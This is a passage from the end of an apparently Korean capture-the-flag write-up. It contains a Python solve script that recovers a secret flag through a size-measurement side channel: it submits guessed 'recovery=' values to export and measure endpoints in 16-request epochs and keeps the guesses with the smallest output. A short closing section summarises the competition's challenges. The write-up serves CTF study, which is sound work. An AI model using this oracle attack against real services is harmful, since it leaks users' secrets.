    def share(self, value: str) -> None:
        self._post("/api/share", {"value": value})

    def export(self, seed: int, style: int, filler: int) -> int:
        result = self._post("/api/export-size", {"seed": seed, "style": style, "filler": filler})
        self.counter = int(result["next_counter"])
        self.requests += 1
        return int(result["size"])

    def measure(self, value: str, exports: list[tuple[int, int, int]]) -> list[int]:
        result = self._post(
            "/api/measure",
            {
                "value": value,
                "exports": [
                    {"seed": seed, "style": style, "filler": filler}
                    for seed, style, filler in exports
                ],
            },
        )
        self.counter = int(result["next_counter"])
        self.requests += len(exports)
        return [int(value) for value in result["sizes"]]

    def measure_batch(
        self, groups: list[tuple[str, list[tuple[int, int, int]]]]
    ) -> list[list[int]]:
        result = self._post(
            "/api/measure-batch",
            {
                "measurements": [
                    {
                        "value": value,
                        "exports": [
                            {"seed": seed, "style": style, "filler": filler}
                            for seed, style, filler in exports
                        ],
                    }
                    for value, exports in groups
                ]
            },
        )
        self.counter = int(result["next_counter"])
        self.requests += sum(len(exports) for _, exports in groups)
        return [[int(value) for value in sizes] for sizes in result["measurements"]]


def score(transport: Transport, note: str, layout: int, bucket: int) -> int:
    if transport.counter % bucket:
        raise RuntimeError("측정은 16요청 epoch 경계에서 시작해야 합니다.")
    if hasattr(transport, "measure"):
        exports = [
            (safe_seed(transport.counter + offset, layout), STYLE, 0) for offset in range(bucket)
        ]
        return sum(transport.measure(note, exports))
    transport.share(note)
    total = 0
    for _ in range(bucket):
        seed = safe_seed(transport.counter, layout)
        total += transport.export(seed, STYLE, 0)
    return total


def score_many(transport: Transport, notes: list[str], layout: int, bucket: int) -> list[int]:
    if not notes:
        return []
    if hasattr(transport, "measure_batch"):
        groups: list[tuple[str, list[tuple[int, int, int]]]] = []
        counter = transport.counter
        for note in notes:
            if counter % bucket:
                raise RuntimeError("측정은 16요청 epoch 경계에서 시작해야 합니다.")
            exports = [(safe_seed(counter + offset, layout), STYLE, 0) for offset in range(bucket)]
            groups.append((note, exports))
            counter += bucket
        return [sum(sizes) for sizes in transport.measure_batch(groups)]
    return [score(transport, note, layout, bucket) for note in notes]


def align_epoch(transport: Transport, layout: int, bucket: int) -> None:
    remaining = (-transport.counter) % bucket
    if not remaining:
        return
    if hasattr(transport, "measure"):
        exports = [
            (safe_seed(transport.counter + offset, layout), STYLE, 0) for offset in range(remaining)
        ]
        transport.measure("", exports)
        return
    transport.share("")
    for _ in range(remaining):
        seed = safe_seed(transport.counter, layout)
        transport.export(seed, STYLE, 0)


def solve(transport: Transport) -> tuple[str, int]:
    schema = load_public_schema()
    alphabet = str(schema["payload_alphabet"])
    length = int(schema["payload_length"])
    layout, _reported_bucket, epoch_size = infer_oracle_parameters(schema)
    public_flag_prefix = str(schema["format"]).split("<payload>", 1)[0]
    prefix = "recovery=" + public_flag_prefix
    align_epoch(transport, layout, epoch_size)
    paths = [""]

    for depth in range(length):
        candidate_values: list[str] = []
        for path in paths:
            for character in alphabet:
                candidate_values.append(path + character)
        scores: list[int] = []
        for start in range(0, len(candidate_values), 16):
            scores.extend(
                score_many(
                    transport,
                    [prefix + candidate for candidate in candidate_values[start : start + 16]],
                    layout,
                    epoch_size,
                )
            )
        candidates = list(zip(scores, candidate_values))
        best = min(value for value, _ in candidates)
        paths = list(dict.fromkeys(candidate for value, candidate in candidates if value == best))[
            :16
        ]
        print(f"[{depth + 1}/{length}] 후보 {len(paths)}개 | 요청 {transport.requests}", flush=True)

    flags: list[str] = []
    notes: list[str] = []
    for payload in paths:
        crc = binascii.crc_hqx(payload.encode(), 0xFFFF)
        flag = f"SHA{{{payload}-{crc:04x}}}"
        flags.append(flag)
        notes.append(f"recovery={flag}")
    final_scores = score_many(transport, notes, layout, epoch_size)
    finals = list(zip(final_scores, flags))
    finals.sort()
    if len(finals) > 1 and finals[0][0] == finals[1][0]:
        raise RuntimeError("최종 후보가 하나로 결정되지 않았습니다.")
    return finals[0][1], transport.requests


def main() -> None:
    flag, requests = solve(HttpTransport())
    print(flag)
    print(f"요청 수: {requests}")


if __name__ == "__main__":
    main()
```
## 3. 마치며

추가 의뢰는 메인 시나리오의 현장 조사와 별도로 진행할 수 있도록 구성했습니다. 웹 서비스의 소스와 동작을 살펴보는 문제부터 커널 객체의 수명 분석, 가상 머신의 최적화 동작 추적, 암호화된 저장소의 복구까지 다양한 주제를 다뤘습니다. 참가자는 각 의뢰서에 담긴 상황을 바탕으로 제공 파일이나 서비스에서 단서를 찾고, 분석 결과를 플래그와 라이트업으로 정리했습니다.

문제마다 접근 방식과 필요한 배경지식은 달랐지만, 의뢰의 단서를 하나씩 확인해 결론에 이르는 과정은 공통적이었습니다. 이 글의 문제별 풀이와 익스플로잇은 그 과정을 다시 따라가 볼 수 있도록 정리한 기록입니다.
